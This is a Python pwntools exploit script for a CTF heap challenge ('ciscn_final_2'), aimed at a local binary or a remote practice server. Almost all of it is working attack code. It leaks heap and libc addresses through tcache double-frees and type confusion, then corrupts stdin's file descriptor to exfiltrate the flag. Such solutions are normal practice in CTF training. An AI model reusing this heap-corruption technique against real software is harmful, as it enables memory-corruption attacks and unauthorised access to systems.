#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./ciscn_final_2')
	elf = ELF('./ciscn_final_2',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote('node3.buuoj.cn',26775)
	elf = ELF('./ciscn_final_2',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def menu(cmd):
	sla("which command?\n> ",str(cmd))

def add(type_node,number):
	menu(1)
	sla("TYPE:\n1: int\n2: short int\n>",str(type_node))
	sla("your inode number:",str(number))

def remove(type_node):
	menu(2)
	sla("TYPE:\n1: int\n2: short int\n>",str(type_node))

def show(type_node):
	menu(3)
	sla("TYPE:\n1: int\n2: short int\n>",str(type_node))
	if(str(type_node)=='1'):
		ru('your int type inode number :')
	else:
		ru('your short type inode number :')
	return int(p.recvuntil('\n', drop=True))


###leak libc&&heap###
add(1,0x30)
remove(1)

for i in range(4):
	add(2,0x20)
remove(2)

add(1,0x30)
remove(2)

chunk0_size = show(2) - 0xa0
success(hex(chunk0_size))

add(2,chunk0_size)
add(2,chunk0_size)
add(2, 0x91)

for i in range(0,7):
	remove(1)
	add(2,0x20)

remove(1)
main_arena = show(1) - 96
libc_base = main_arena - libc.sym['__malloc_hook'] - 0x10
file_no = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70
success(hex(libc_base))
success(hex(file_no))


###modify fileno###
add(1,file_no)

add(1,0x30)
remove(1)
add(2,0x20)
remove(1)

chunk_fd = show(1) - 0x30
add(1,chunk_fd)
add(1,chunk_fd)
add(1,file_no)

add(1,666)

###get shell###
sla('which command?\n> ', '4')
ia()

	
